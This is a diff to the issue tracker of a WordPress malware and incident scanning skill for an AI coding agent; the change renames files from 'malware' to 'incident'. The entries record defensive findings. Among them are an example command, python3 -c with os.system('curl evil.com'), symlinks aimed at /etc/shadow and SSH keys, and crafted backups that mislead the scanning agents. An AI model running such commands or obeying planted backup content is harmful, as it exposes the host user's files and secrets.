@@ -76,7 +76,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: High
-- **Component**: `wp-malware-prescan.py` — `scan_php_patterns()`, `read_core_files()`, `read_theme_functions()`
+- **Component**: `wp-incident-prescan.py` — `scan_php_patterns()`, `read_core_files()`, `read_theme_functions()`
 - **Description**: `scan_php_patterns()` resolves symlinks for loop detection but does not verify the resolved path stays within the backup directory. A crafted backup with symlinks pointing to `/etc/shadow`, `~/.ssh/id_rsa`, or `.env` files would cause the pre-scanner to read those files and include their content in JSON output. `scan_suspicious_files()` reports symlinks outside root but other scan functions still follow and read them.
 - **Fix**: After resolving a symlink, check that the resolved path starts with the WordPress root before reading. Apply this check in `scan_php_patterns()`, `read_core_files()`, and `read_theme_functions()`.
 
@@ -84,15 +84,15 @@ Track work completed on this skill.
 
 - **Status**: Pending
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py`, `prompt.md`
-- **Description**: The scanner writes output directly into the scanned backup directory (`prescan-data/`, `scan-results/`, `wp-prescan-results.json`, `malware-scan-report.md`). This modifies timestamps and directory structure of forensic evidence. If the user accidentally points the tool at a live WordPress installation, these files would be web-accessible.
+- **Component**: `wp-incident-prescan.py`, `prompt.md`
+- **Description**: The scanner writes output directly into the scanned backup directory (`prescan-data/`, `scan-results/`, `wp-prescan-results.json`, `incident-scan-report.md`). This modifies timestamps and directory structure of forensic evidence. If the user accidentally points the tool at a live WordPress installation, these files would be web-accessible.
 - **Fix**: Write output to a separate directory outside the backup (e.g., `/tmp/wp-scan-{hash}/` or a user-specified output path).
 
 ### SEC-04: Sensitive Data Exposure in Output Files [MEDIUM]
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py` — `read_core_files()`, `scan_sql_dump()`
+- **Component**: `wp-incident-prescan.py` — `read_core_files()`, `scan_sql_dump()`
 - **Description**: `read_core_files()` explicitly reads `wp-config.php`, which typically contains database credentials, auth keys, and salts. This content is written to `prescan-data/core-files.json` in plaintext. `database.json` may also contain user password hashes and email addresses. These output files persist on disk after the scan with no cleanup mechanism.
 - **Fix**: Added `redact_wp_config()` to replace values of `DB_PASSWORD`, auth keys, and salts with `[REDACTED]` while preserving file structure for malware detection. Added `redact_email()` to partially redact user emails (keeps first char + domain for suspicious domain analysis). Added `sensitive_data_notice` to output metadata warning that files should be treated as confidential. `DB_NAME`, `DB_HOST`, `DB_USER` kept visible for structural analysis.
 
@@ -100,7 +100,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py`
+- **Component**: `wp-incident-prescan.py`
 - **Description**: No limits on total files scanned (a crafted backup with millions of tiny PHP files would run indefinitely, and `rglob()` is called 4+ times). No limit on individual file size (`php_file.read_text()` reads entire files into memory — a single 2GB PHP file would exhaust memory). SQL line-by-line reading is memory-efficient but a single very long line could still be problematic.
 - **Fix**: Added `MAX_FILE_READ_SIZE` (10MB) — files exceeding this are skipped before `read_text()`. Added `MAX_FILE_COUNT` (500K) — scanning stops after this many files in `scan_php_patterns()`, `scan_suspicious_files()`, and `analyze_timestamps()`. Skipped/limit counts are reported in output and stderr.
 
@@ -108,7 +108,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py` — `scan_sql_dump()`
+- **Component**: `wp-incident-prescan.py` — `scan_sql_dump()`
 - **Description**: `scan_sql_dump()` opens `.sql.gz` files with `gzip.open()`. A gzip bomb (small compressed file that decompresses to enormous size) would cause the line-by-line reader to run indefinitely. While it won't exhaust memory all at once due to line-by-line reading, it would cause an extremely long-running process.
 - **Fix**: Added `MAX_GZIP_DECOMPRESSED_BYTES` (5GB). `scan_sql_dump()` tracks cumulative bytes read from gzipped files and aborts with an error message when the limit is exceeded.
 
@@ -116,7 +116,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Low
-- **Component**: `wp-malware-prescan.py`, `prompt.md` — Agents 10, 11+
+- **Component**: `wp-incident-prescan.py`, `prompt.md` — Agents 10, 11+
 - **Description**: Agents 11+ construct WebSearch queries using plugin slugs and version numbers extracted from the backup. A malicious backup could include a plugin with a crafted slug/name designed to produce misleading search results or lead to attacker-controlled content when searched.
 - **Fix**: Added `sanitize_slug()`, `sanitize_version()`, and `sanitize_name()` to the pre-scanner. Slugs are restricted to alphanumeric/hyphen/underscore characters and length-limited (100 chars). Versions are validated against a numeric pattern (30 chars max). Names have control characters stripped (200 chars max). Updated `prompt.md` to instruct agents to use only sanitized slugs (never display names) in queries, and to skip plugins with suspicious-looking slugs.
 
@@ -124,7 +124,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Low
-- **Component**: `wp-malware-prescan.py` — `PHP_SUSPICIOUS_PATTERNS`
+- **Component**: `wp-incident-prescan.py` — `PHP_SUSPICIOUS_PATTERNS`
 - **Description**: The pattern `preg_replace_callback\s*\(\s*.*\$` uses `.*` followed by a literal `\$`, which could cause quadratic backtracking on long lines without a `$` character. Impact is limited since lines are processed individually and content is truncated at 200 chars, but crafted input could slow the scanner.
 - **Fix**: Replace `.*` with a non-greedy `.*?` or a more specific character class.
 
@@ -132,7 +132,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: High
-- **Component**: `wp-malware-prescan.py` — `scan_sql_dump()`, line ~695
+- **Component**: `wp-incident-prescan.py` — `scan_sql_dump()`, line ~695
 - **Description**: The script tag safe-list check (`elementor|rank.?math|...`) runs against the entire SQL line. In mysqldump's extended INSERT format, a single `INSERT INTO wp_options VALUES (...)` line contains thousands of rows. If any option value on the line mentions a safe-listed plugin name (nearly guaranteed on real sites), ALL script tag matches on that line are silently skipped — including genuinely malicious injections like the `4r4r.js` payload found in the original manual scan.
 - **Fix**: Instead of checking the entire line against the safe-list, extract a narrow window around each regex match position (e.g., 500 chars) and apply the safe-list only to that window. This ensures legitimate plugin references elsewhere on the same INSERT line don't suppress unrelated malicious matches.
 
@@ -140,7 +140,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py` — `scan_sql_dump()`, line ~704
+- **Component**: `wp-incident-prescan.py` — `scan_sql_dump()`, line ~704
 - **Description**: Match context is `line.strip()[:300]`, which captures the first 300 characters of the SQL line. In extended INSERT format, the malicious content may be tens of thousands of characters into the line. The agent receives a match flagged as "script tag in wp_options" but the context just shows `INSERT INTO wp_options VALUES (1,'siteurl','https://...` — no indication of what the actual payload was or which option it belongs to. This caused the `ihaf_insert_header` injection to be effectively invisible to the analysis agent even if the pattern matched.
 - **Fix**: Use `re.search()` match position to capture context centered on the match: `line[max(0, match.start()-150):match.end()+150]`. This ensures the agent sees the actual malicious content and surrounding option name.
 
@@ -148,7 +148,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-03)
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py` — `scan_sql_dump()`, `target_options` set (line ~652)
+- **Component**: `wp-incident-prescan.py` — `scan_sql_dump()`, `target_options` set (line ~652)
 - **Description**: The `target_options` set extracts 11 specific options but misses options commonly abused for script injection. The `ihaf_insert_header`/`ihaf_insert_footer` options (WPCode / Insert Headers and Footers plugin) are prime injection targets because they output directly into every page's `<head>` or footer. Other commonly abused options include custom CSS/JS options and tracking code options from various plugins.
 - **Fix**: Add a regex-based extraction pass that captures any option whose name matches injection-prone patterns: `insert_header`, `insert_footer`, `tracking_code`, `custom_css`, `custom_js`, `head_script`, `body_script`, `header_code`, `footer_code`, etc. Extract and include these values in the database JSON so Agent 8 can review them.
 
@@ -156,7 +156,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-04)
 - **Severity**: Low
-- **Component**: `wp-malware-prescan.py` — `scan_sql_dump()`
+- **Component**: `wp-incident-prescan.py` — `scan_sql_dump()`
 - **Description**: The `4r4r.js` injection was hidden behind ~60 empty `\r\n` lines to push it below the visible area in the WPCode admin textarea. While the `<script>` pattern should catch the tag itself (if DB-01 doesn't suppress it), there's no specific detection for this obfuscation technique. Flagging "active content preceded by excessive whitespace" would catch this class of attack and provide useful context to the analysis agent about the attacker's intent to hide the payload.
 - **Fix**: Add a DB_SUSPICIOUS_PATTERNS entry or post-processing check that flags option values containing active content (`<script>`, `<iframe>`, `<?php`, `eval`) preceded by more than 10 consecutive `\r\n` or `\n` sequences. Report the whitespace padding as an additional indicator of malicious intent.
 
@@ -164,7 +164,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-04)
 - **Severity**: High
-- **Component**: `wp-malware-prescan.py`, `prompt.md`
+- **Component**: `wp-incident-prescan.py`, `prompt.md`
 - **Description**: PHP error logs (`error_log`, `debug.log`, `php-errors.log`) are one of the richest sources of compromise evidence. In the reference scan, error logs revealed: (1) IOC-3 — a `wp_set_password()` injection into wp-config.php line 77, discovered only via a PHP fatal error entry; (2) exact timestamps of 6 auto-login backdoor uses over Dec 23-24; (3) export failure patterns on Dec 22 that established the timeline start. The skill has zero awareness of error logs — neither the pre-scanner nor any agent prompt mentions them. WordPress sites commonly have `debug.log` in `wp-content/`, PHP error logs in the web root or a logs directory, and hosting-specific log paths.
 - **Fix**: Add a discovery step to locate common log files (`wp-content/debug.log`, `error_log`, `php-errors.log`, `*.log` in root). Add a pre-scanner section that extracts PHP fatal errors, warnings referencing WP files, authentication-related entries, and file operation entries. Create a new agent (or extend Agent 5 / timestamps) to analyze log entries for compromise evidence and build a timeline.
 
@@ -172,7 +172,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-04)
 - **Severity**: High
-- **Component**: `wp-malware-prescan.py`, `prompt.md`
+- **Component**: `wp-incident-prescan.py`, `prompt.md`
 - **Description**: Security plugins like Wordfence write access logs, firewall logs, and attack data to `wp-content/wflogs/`. In the reference scan, Wordfence logs confirmed the `4r4r.js` injection was actively executing (a 404 hit for `/4r4r.js` from IP `159.26.106.157`). Other security plugins (Sucuri, Shield, MalCare) also write logs. The skill doesn't scan any of these directories. These logs can provide IP addresses of attackers, blocked attack attempts, firewall rule changes, and evidence of security plugin tampering.
 - **Fix**: Add discovery of `wp-content/wflogs/`, `wp-content/plugins/wordfence/`, and similar security plugin log directories. Extract recent attack data, access logs, firewall events, and configuration changes. Feed to a database/log analysis agent for correlation with other findings.
 
@@ -180,7 +180,7 @@ Track work completed on this skill.
 
 - **Status**: Completed (2026-02-04)
 - **Severity**: Medium
-- **Component**: `wp-malware-prescan.py` — `scan_sql_dump()`
+- **Component**: `wp-incident-prescan.py` — `scan_sql_dump()`
 - **Description**: WordPress multisite installations use `wp_N_*` table prefixes for subsites (e.g., `wp_2_options`, `wp_3_posts`). The pre-scanner only extracts options from the main `_options` table and doesn't detect or analyze subsite tables. In the reference scan, a `wp_2_options` subsite was found with: a suspicious admin email (`92juber.shaikh@gmail.com`) unrelated to any known user, an active `wp-file-manager` v8.0.2 (CVE-2020-25213, CVSS 10.0 unauthenticated RCE), URL misconfiguration, a different theme from the main site, and stale cron jobs from 2019. Abandoned subsites with vulnerable plugins are a common attack vector.
 - **Fix**: Detect multisite by checking for `wp_N_options` tables in CREATE TABLE statements. For each subsite found, extract `siteurl`, `home`, `active_plugins`, `template`, `stylesheet`, and admin email from its options table. Report subsites with their plugin inventories so agents can flag abandoned or vulnerable subsite plugins.
 
@@ -211,7 +211,7 @@ Track work completed on this skill.
 - **Severity**: High
 - **Component**: `prompt.md` — Phase 5 (Report Compiler agent)
 - **Related bug**: BUG-01
-- **Description**: The Report Compiler reads 18 agent report files and writes a single combined `malware-scan-report.md`. This combined report far exceeds what can fit in a single Write call (~8,000 chars). The orchestrator has the same 4096 token limit, so moving compilation out of a sub-agent doesn't help. The compiler (or orchestrator) must write the report incrementally across multiple turns.
+- **Description**: The Report Compiler reads 18 agent report files and writes a single combined `incident-scan-report.md`. This combined report far exceeds what can fit in a single Write call (~8,000 chars). The orchestrator has the same 4096 token limit, so moving compilation out of a sub-agent doesn't help. The compiler (or orchestrator) must write the report incrementally across multiple turns.
 - **Fix**: Restructure the Report Compiler instructions to write the report in sections using Bash append:
   1. First turn: Write report header + Summary table (`cat > file << 'EOF'`)
   2. Subsequent turns: Append each section (`cat >> file << 'EOF'`): Vulnerability Assessment, Likely Entry Points, Plugin Inventory, Detailed Findings (one append per agent category), Compromise Timeline, Recommendations
@@ -225,7 +225,7 @@ Track work completed on this skill.
 - **Status**: Superseded (2026-02-04)
 - **Severity**: High
 - **Related bug**: BUG-02
-- **Component**: `wp-malware-prescan.py` — `analyze_timestamps()`
+- **Component**: `wp-incident-prescan.py` — `analyze_timestamps()`
 - **Description**: Agent 5 is instructed to compare core file timestamps against the WP version's release date, but `timestamps.json` contains only the version string — no release date. The agent must guess the release date from training data, which led to BUG-02 (hallucinated WP 6.9 installation date 6 months before release). Additionally, `version.php` reflects the current version after upgrades, not the originally installed version, but nothing in the prescan data communicates this distinction.
 - **Original fix**: Add a hardcoded `WP_RELEASE_DATES` dictionary to the prescan script.
 - **Superseded by**: Orchestrator WebSearch approach — Phase 1 of `prompt.md` now performs a WebSearch for the WP version release date, keeping the prescan script offline/deterministic. The release date is passed to Agent 5 in the prompt.
@@ -248,7 +248,7 @@ Track work completed on this skill.
 - **Status**: Completed (2026-02-04)
 - **Summary**: Split monolithic `prompt.md` into `prompts/` directory (preamble + 4 phase files + error-handling). Merged old Phases 2+3 into single parallel phase. 60-90% input token reduction per turn.
 
-### REFACTOR-02: Modularize wp-malware-prescan.py into package [MEDIUM]
+### REFACTOR-02: Modularize wp-incident-prescan.py into package [MEDIUM]
 
 - **Status**: Completed (2026-02-04)
 - **Summary**: Extracted into `prescan/` package (constants, utils, discovery, 7 scanner modules, orchestration). Entry point shim preserved. Verified identical output against baseline.
@@ -258,7 +258,7 @@ Track work completed on this skill.
 - **Status**: Pending
 - **Severity**: Low
 - **Component**: `SKILL.md`
-- **Description**: `SKILL.md` uses `$ARGUMENTS` in a bash command: `python3 ~/.claude/skills/wp-malware-scan/wp-malware-prescan.py "$ARGUMENTS"`. Double quotes prevent word splitting and glob expansion, but a path containing backticks or `$()` could still trigger shell command substitution. In practice, Claude Code's Bash tool likely handles this safely, but it's worth verifying.
+- **Description**: `SKILL.md` uses `$ARGUMENTS` in a bash command: `python3 ~/.claude/skills/wp-incident-scan/wp-incident-prescan.py "$ARGUMENTS"`. Double quotes prevent word splitting and glob expansion, but a path containing backticks or `$()` could still trigger shell command substitution. In practice, Claude Code's Bash tool likely handles this safely, but it's worth verifying.
 - **Mitigation**: Verify Claude Code's handling of `$ARGUMENTS` expansion, or pass the path via a mechanism that avoids shell interpretation.
 
 ### TOOL-01: `Bash(cat *)` Allows Reading Any File on Host [HIGH]
@@ -276,7 +276,7 @@ Track work completed on this skill.
 - **Severity**: High
 - **Component**: `SKILL.md` — `allowed-tools`
 - **Description**: `Bash(python3 *)` matches any Python command, including `python3 -c "import os; os.system('curl evil.com')"`. Intended only for running the pre-scanner script. Combined with SEC-01, a compromised agent could execute arbitrary Python with full user privileges.
-- **Fix**: Restrict to the specific script path: `Bash(python3 ~/.claude/skills/wp-malware-scan/wp-malware-prescan.py *)`.
+- **Fix**: Restrict to the specific script path: `Bash(python3 ~/.claude/skills/wp-incident-scan/wp-incident-prescan.py *)`.
 
 ### TOOL-03: WebSearch/WebFetch Available to All Agents [HIGH]
 
@@ -502,8 +502,8 @@ Track work completed on this skill.
 - **Status**: Pending
 - **Severity**: Low
 - **Component**: `prompts/phase-4-report.md`
-- **Description**: The final report is Markdown only (`malware-scan-report.md`). A JSON companion report would enable integration with ticketing systems, SIEMs, dashboards, or automated remediation pipelines. Structured data (finding severity, file paths, CVE IDs, IOCs) is easier to consume programmatically than parsing Markdown tables.
-- **Fix**: Add a parallel JSON output step in Phase 4. The report compiler (or orchestrator) writes `malware-scan-report.json` alongside the Markdown report, containing structured data: verdict, findings array (each with severity, category, file, description), CVEs, IOCs, timeline events, and remediation items.
+- **Description**: The final report is Markdown only (`incident-scan-report.md`). A JSON companion report would enable integration with ticketing systems, SIEMs, dashboards, or automated remediation pipelines. Structured data (finding severity, file paths, CVE IDs, IOCs) is easier to consume programmatically than parsing Markdown tables.
+- **Fix**: Add a parallel JSON output step in Phase 4. The report compiler (or orchestrator) writes `incident-scan-report.json` alongside the Markdown report, containing structured data: verdict, findings array (each with severity, category, file, description), CVEs, IOCs, timeline events, and remediation items.
 
 ### GAP-14: No YARA Rule Support [LOW]
 
